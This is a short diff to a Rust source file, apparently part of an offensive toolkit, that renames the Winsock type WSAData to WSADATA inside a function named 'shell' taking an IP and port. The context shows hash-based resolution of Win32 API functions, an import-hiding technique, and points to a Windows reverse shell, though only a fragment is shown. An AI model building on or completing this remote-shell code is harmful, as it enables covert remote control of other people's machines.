@@ -3,7 +3,7 @@ use std::{mem, ptr};
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HANDLE};
 use windows::Win32::Networking::WinSock::{
-    WSAData, AF_INET, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSAPROTOCOL_INFOA,
+    WSADATA, AF_INET, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSAPROTOCOL_INFOA,
 };
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Threading::{
@@ -17,8 +17,8 @@ const WSASTARTUPVAL: u16 = 514;
 pub fn shell(ip: &str, port: u16) {
     // See line 15
     let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
-    let function = rco_utils::construct_win32_function!(function; [u16, &mut WSAData]; [()]);
-    unsafe { function(WSASTARTUPVAL, &mut WSAData::default()) };
+    let function = rco_utils::construct_win32_function!(function; [u16, &mut WSADATA]; [()]);
+    unsafe { function(WSASTARTUPVAL, &mut WSADATA::default()) };
 
     // See line 28
     let function = rco_utils::find_function_address("Ws2_32", 0xad51563d572a6798).unwrap();
